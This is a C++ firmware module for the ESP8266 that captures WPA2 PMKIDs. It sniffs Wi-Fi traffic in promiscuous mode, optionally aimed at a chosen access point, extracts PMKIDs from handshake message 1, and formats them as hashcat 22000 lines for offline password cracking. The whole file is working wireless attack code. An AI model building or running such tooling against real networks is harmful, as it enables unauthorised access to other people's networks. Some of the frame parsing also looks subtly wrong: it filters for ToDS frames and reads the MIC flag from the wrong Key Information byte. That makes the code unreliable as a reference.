#include "pmkid_capture.h"

extern "C" {
    #include "user_interface.h"
}

extern void addLog(const String& msg);

// ---------------------------------------------------------------------------
// 802.11 Data frame layout (ESP8266 promiscuous, RxControl = 36 bytes):
//
// buf[36..37]  Frame Control (FC)
// buf[38..39]  Duration
// buf[40..45]  Address 1
// buf[46..51]  Address 2
// buf[52..57]  Address 3
// buf[58..59]  Seq Control
// buf[60+]     Frame body
//
// Data body (non-QoS ToDS frame):
// buf[60..62]  LLC: AA AA 03
// buf[63..65]  OUI: 00 00 00
// buf[66..67]  EtherType: 88 8E  (EAPOL)
// buf[68]      EAPOL Version
// buf[69]      EAPOL Type: 03 = EAPOL-Key
// buf[70..71]  EAPOL Length
// buf[72]      Key Descriptor Type: 02 = RSN
// buf[73..74]  Key Information
// buf[75..76]  Key Length
// buf[77..84]  Replay Counter
// buf[85..116] Key Nonce (32 bytes)
// buf[117..132]  Key IV (16 bytes)
// buf[133..140]  Key RSC (8 bytes)
// buf[141..148]  Key ID (8 bytes)
// buf[149..164]  Key MIC (16 bytes)
// buf[165..166]  Key Data Length
// buf[167+]      Key Data (RSN IE may contain PMKID)
//
// RSN IE structure in Key Data:
//   tag: 0x30
//   len: varies
//   ... PMKID Count (2 bytes) at some offset
//   PMKID[0..15]
//
// The PMKID is in Message 1 of the 4-way handshake:
//   Key Info bits: Ack=1, Install=0, MIC=0 (it is M1 if MIC bit is 0 and Ack=1)
// ---------------------------------------------------------------------------

#define RX_CTRL_LEN  36
#define LLC_OFFSET   (RX_CTRL_LEN + 24)  // For ToDS non-QoS frames
#define EAPOL_OFFSET (LLC_OFFSET + 8)     // After LLC (3) + OUI (3) + EtherType (2)

PMKIDCaptureModule* PMKIDCaptureModule::_instance = nullptr;

PMKIDCaptureModule::PMKIDCaptureModule()
    : capturing(false), captureCount(0), hasTarget(false) {
    memset(targetBSSID, 0, 6);
    for (int i = 0; i < MAX_PMKIDS; i++) {
        entries[i].valid = false;
    }
}

void PMKIDCaptureModule::begin() {
    addLog("[PMKID] Modulo iniciado");
}

void PMKIDCaptureModule::parseBSSID(const String& s, uint8_t* out) {
    sscanf(s.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]);
}

void PMKIDCaptureModule::startCapture(const String& targetBSSID_str) {
    if (capturing) return;

    captureCount = 0;
    for (int i = 0; i < MAX_PMKIDS; i++) entries[i].valid = false;

    if (targetBSSID_str.length() > 0) {
        parseBSSID(targetBSSID_str, targetBSSID);
        hasTarget = true;
        addLog("[PMKID] Capturando para BSSID: " + targetBSSID_str);
    } else {
        hasTarget = false;
        addLog("[PMKID] Capturando todos los BSSIDs");
    }

    _instance = this;
    wifi_set_promiscuous_rx_cb(pmkidPromiscCb);
    wifi_promiscuous_enable(1);
    capturing = true;
}

void PMKIDCaptureModule::stopCapture() {
    if (!capturing) return;
    capturing = false;
    wifi_promiscuous_enable(0);
    wifi_set_promiscuous_rx_cb(nullptr);
    _instance = nullptr;
    addLog("[PMKID] Captura detenida. PMKIDs: " + String(captureCount));
}

bool PMKIDCaptureModule::isCapturing() const {
    return capturing;
}

int PMKIDCaptureModule::getCaptureCount() const {
    return captureCount;
}

void IRAM_ATTR PMKIDCaptureModule::pmkidPromiscCb(uint8_t* buf, uint16_t len) {
    if (!_instance) return;
    _instance->processFrame(buf, len);
}

void PMKIDCaptureModule::processFrame(const uint8_t* buf, uint16_t len) {
    // Need at least: RxControl(36) + MAC headers(24) + LLC(8) + EAPOL min(4) + Key header(95)
    if (len < (uint16_t)(RX_CTRL_LEN + 24 + 8 + 4 + 95)) return;

    uint8_t fc0 = buf[RX_CTRL_LEN + 0];
    uint8_t fc1 = buf[RX_CTRL_LEN + 1];

    // Only data frames (type = 0x02 in bits 3:2 of FC[0])
    // FC[0] & 0x0C == 0x08  (Data type)
    if ((fc0 & 0x0C) != 0x08) return;

    // Only ToDS frames (FC[1] bit 0 = 1, bit 1 = 0)
    uint8_t ds = fc1 & 0x03;
    if (ds != 0x01) return;  // ToDS: SA = buf[46..51], BSSID = buf[40..45]

    uint8_t* apMAC  = &(const_cast<uint8_t*>(buf))[40];
    uint8_t* staMAC = &(const_cast<uint8_t*>(buf))[46];

    // Filter by target BSSID if set
    if (hasTarget && memcmp(apMAC, targetBSSID, 6) != 0) return;

    // Skip QoS frames (they have 2 extra bytes before LLC)
    // FC[0] bits 7:4 = subtype. QoS Data = 0x88
    int llcOff;
    if (fc0 == 0x88) {
        llcOff = RX_CTRL_LEN + 26;  // QoS Control = 2 extra bytes
    } else {
        llcOff = RX_CTRL_LEN + 24;
    }

    if (len < (uint16_t)(llcOff + 8 + 4)) return;

    // Check LLC SNAP header: AA AA 03 00 00 00
    if (buf[llcOff] != 0xAA || buf[llcOff + 1] != 0xAA || buf[llcOff + 2] != 0x03) return;

    // Check EtherType 88 8E (EAPOL)
    if (buf[llcOff + 6] != 0x88 || buf[llcOff + 7] != 0x8E) return;

    int eapolOff = llcOff + 8;
    if (len < (uint16_t)(eapolOff + 99)) return;

    // EAPOL type: 03 = Key
    if (buf[eapolOff + 1] != 0x03) return;

    // Key Descriptor Type: 02 = RSN/WPA2
    if (buf[eapolOff + 4] != 0x02) return;

    // Message 1: Ack=1 (bit 7 in ki2), MIC=0 (bit 0 in ki2)
    uint8_t ki2 = buf[eapolOff + 6];
    bool ack = (ki2 & 0x80) != 0;
    bool mic = (ki2 & 0x01) != 0;
    if (!ack || mic) return;  // Not message 1

    // Key Data Length at eapolOff + 97..98
    if (len < (uint16_t)(eapolOff + 99)) return;
    uint16_t keyDataLen = ((uint16_t)buf[eapolOff + 97] << 8) | buf[eapolOff + 98];

    if (keyDataLen < 22 || len < (uint16_t)(eapolOff + 99 + keyDataLen)) return;

    // Scan Key Data for RSN IE (tag 0x30) containing PMKID
    int kdOff = eapolOff + 99;
    int kdEnd = kdOff + keyDataLen;

    while (kdOff + 2 <= kdEnd) {
        uint8_t tag = buf[kdOff];
        uint8_t tlen = buf[kdOff + 1];
        if (kdOff + 2 + tlen > kdEnd) break;

        if (tag == 0x30 && tlen >= 20) {
            // RSN IE: version(2) + group cipher(4) + pairwise count(2) + pairwise(4*n)
            // + akm count(2) + akm(4*n) + capabilities(2) + PMKID count(2) + PMKID(16*n)
            // Minimum RSN IE with 1 pairwise + 1 AKM + 1 PMKID:
            // 2+4+2+4+2+4+2+2+16 = 38 bytes
            if (tlen >= 38) {
                // Try to locate PMKID by scanning for PMKID count field
                // Find pairwise count at offset 6 from tag start
                int base = kdOff + 2;
                uint16_t pairCount = ((uint16_t)buf[base + 6] << 8) | buf[base + 7];
                if (pairCount > 4) { kdOff += 2 + tlen; continue; }
                int akmOff = base + 8 + (pairCount * 4);
                if (akmOff + 2 > kdEnd) { kdOff += 2 + tlen; continue; }
                uint16_t akmCount = ((uint16_t)buf[akmOff] << 8) | buf[akmOff + 1];
                if (akmCount > 4) { kdOff += 2 + tlen; continue; }
                int capOff = akmOff + 2 + (akmCount * 4);
                int pmkidCountOff = capOff + 2;
                if (pmkidCountOff + 2 > kdEnd) { kdOff += 2 + tlen; continue; }
                uint16_t pmkidCount = ((uint16_t)buf[pmkidCountOff] << 8) | buf[pmkidCountOff + 1];
                if (pmkidCount == 0 || pmkidCount > 4) { kdOff += 2 + tlen; continue; }
                int pmkidOff = pmkidCountOff + 2;
                if (pmkidOff + 16 > kdEnd) { kdOff += 2 + tlen; continue; }

                // Valid PMKID found!
                if (captureCount >= MAX_PMKIDS) return;

                // Check if we already have this PMKID
                for (int i = 0; i < captureCount; i++) {
                    if (memcmp(entries[i].pmkid, &buf[pmkidOff], 16) == 0) return;
                }

                PMKIDEntry& e = entries[captureCount];
                memcpy(e.pmkid,  &buf[pmkidOff], 16);
                memcpy(e.apMAC,  apMAC,  6);
                memcpy(e.staMAC, staMAC, 6);
                e.ssid = "";
                e.valid = true;
                e.capturedAt = millis();
                buildHashcatLine(e);
                captureCount++;

                // Log it (from non-IRAM context, so schedule via flag)
                // We can't call addLog from ISR context, mark for later
                return;
            }
        }
        kdOff += 2 + tlen;
    }
}

void PMKIDCaptureModule::buildHashcatLine(PMKIDEntry& e) {
    // hashcat 22000 format:
    // WPA*02*<pmkid_hex>*<ap_mac_nocolon>*<sta_mac_nocolon>*<ssid_hex>***
    char line[160];
    char pmkidHex[33] = {};
    char apHex[13]    = {};
    char staHex[13]   = {};
    char ssidHex[65]  = {};

    for (int i = 0; i < 16; i++)
        snprintf(pmkidHex + (i * 2), 3, "%02x", e.pmkid[i]);
    for (int i = 0; i < 6; i++)
        snprintf(apHex + (i * 2), 3, "%02x", e.apMAC[i]);
    for (int i = 0; i < 6; i++)
        snprintf(staHex + (i * 2), 3, "%02x", e.staMAC[i]);

    int slen = min((int)e.ssid.length(), 32);
    for (int i = 0; i < slen; i++)
        snprintf(ssidHex + (i * 2), 3, "%02x", (uint8_t)e.ssid[i]);

    snprintf(line, sizeof(line), "WPA*02*%s*%s*%s*%s***",
             pmkidHex, apHex, staHex, ssidHex);
    strncpy(e.hashcatLine, line, sizeof(e.hashcatLine) - 1);
    e.hashcatLine[sizeof(e.hashcatLine) - 1] = '\0';
}

String PMKIDCaptureModule::getHashcatOutput() const {
    String out = "";
    for (int i = 0; i < captureCount; i++) {
        if (entries[i].valid) {
            out += String(entries[i].hashcatLine) + "\n";
        }
    }
    return out;
}

String PMKIDCaptureModule::getJSON() const {
    String j = "[";
    for (int i = 0; i < captureCount; i++) {
        if (!entries[i].valid) continue;
        if (i > 0) j += ",";
        char apStr[18], staStr[18];
        snprintf(apStr, sizeof(apStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                 entries[i].apMAC[0], entries[i].apMAC[1], entries[i].apMAC[2],
                 entries[i].apMAC[3], entries[i].apMAC[4], entries[i].apMAC[5]);
        snprintf(staStr, sizeof(staStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                 entries[i].staMAC[0], entries[i].staMAC[1], entries[i].staMAC[2],
                 entries[i].staMAC[3], entries[i].staMAC[4], entries[i].staMAC[5]);
        j += "{\"ap\":\"" + String(apStr) + "\",";
        j += "\"sta\":\"" + String(staStr) + "\",";
        j += "\"hashcat\":\"" + String(entries[i].hashcatLine) + "\"}";
    }
    j += "]";
    return j;
}
